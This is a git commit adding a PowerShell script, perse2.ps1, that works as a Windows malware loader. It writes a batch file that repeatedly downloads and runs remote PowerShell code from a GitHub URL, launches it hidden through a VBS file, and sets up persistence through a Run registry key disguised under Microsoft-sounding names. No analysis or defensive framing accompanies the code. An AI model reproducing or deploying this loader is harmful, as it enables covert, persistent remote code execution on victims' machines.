c05236c4e3700f0fd40eb56eb5e83d4acb57021a
alejq41 <93050806+alejq41@users.noreply.github.com>
2022-08-25 09:40:13 -0500

    Create perse2.ps1

---
+++ perse2.ps1
@@ -0,0 +1,11 @@
+md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
+:a
+powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercod1.ps1').GetResponse().GetResponseStream()).ReadToEnd());
+timeout /t 30
+goto a
+"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.bat" $contenttoadd; $contentToAdd = @"
+WScript.Sleep 10000
+set objshell = createobject("wscript.shell")
+objshell.run "C:\Intel\Profiles/IE/IEX\MSDLSIM.bat",vbhide
+"@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs" $contenttoadd; REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Microsoft_Edge_Company /d C:\Intel\Profiles/IE/IEX/MSDLSIM.vbs; cd C:\Intel\Profiles/IE/IEX; ./MSDLSIM.vbs
+exit
